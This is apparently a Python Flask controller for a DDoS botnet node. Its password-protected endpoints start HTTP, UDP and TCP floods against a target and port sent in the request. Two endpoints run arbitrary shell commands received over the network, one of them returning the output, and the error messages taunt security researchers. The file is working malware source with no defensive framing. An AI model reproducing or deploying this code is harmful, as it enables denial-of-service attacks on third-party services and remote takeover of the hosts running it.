from flask import Flask
import threading
from flask import request
import json
import os
import hammer
import udpflood
import subprocess

app = Flask(__name__)

@app.route('/')
def home():
	return "keep-alive"

@app.route('/slowhttp',methods=["POST"])
def slowhttp():
	info = json.loads(request.get_data())
	if info["pass"] != os.getenv("password"):
		return "fuck off researcher!!"
	subprocess.Popen(info["command"],shell=True)
	return "successful"


@app.route('/http',methods=["POST"])
def attack():

	info = json.loads(request.get_data())
	if info["pass"] != os.getenv("password"):
		return "fuck off researcher!!"
	hammer.host = info["target"]
	hammer.port = info["port"]
	hammer.thr = info["thread"]
	hammer.flag = True
	ddos = threading.Thread(target=hammer.start)
	ddos.setDaemon(True)
	ddos.start()
	return "successful"

@app.route('/udp')
def udp():
	info = json.loads(request.get_data())
	if info["pass"] != os.getenv("password"):
		return "fuck off researcher!!"
	udpflood.flag = True
	udpflood.ip = info["target"]
	udpflood.port = info["port"]
	udpflood.threads = info["thread"]
	udpflood.times = info["time"]
	udpflood.choice = "y"
	th = threading.Thread(target=udpflood.mainudp).start()
	return "successful"

@app.route('/tcp',methods=["POST"])
def tcp():
	info = json.loads(request.get_data())
	if info["pass"] != os.getenv("password"):
		return "fuck off researcher!!"
	udpflood.flag = True
	udpflood.ip = info["target"]
	udpflood.port = info["port"]
	udpflood.threads = info["thread"]
	udpflood.times = info["time"]
	udpflood.choice = "n"
	th = threading.Thread(target=udpflood.mainudp).start()

@app.route('/eval')
def eval():
	info = json.loads(request.get_data())
	if info["pass"] != os.getenv("password"):
		return "fuck off researcher!!"
	proc = subprocess.run(info["command"],shell=True,stdout = subprocess.PIPE, stderr = subprocess.PIPE)
	return proc.stdout

@app.route('/stop',methods=["POST"])
def stop():
	info = json.loads(request.get_data())
	if info["pass"] != os.getenv("password"):
		return "fuck off researcher!!"
	hammer.flag = False
	udpflood.flag = False
	return "successful"

def run():
	app.run('0.0.0.0',port=8080)


run()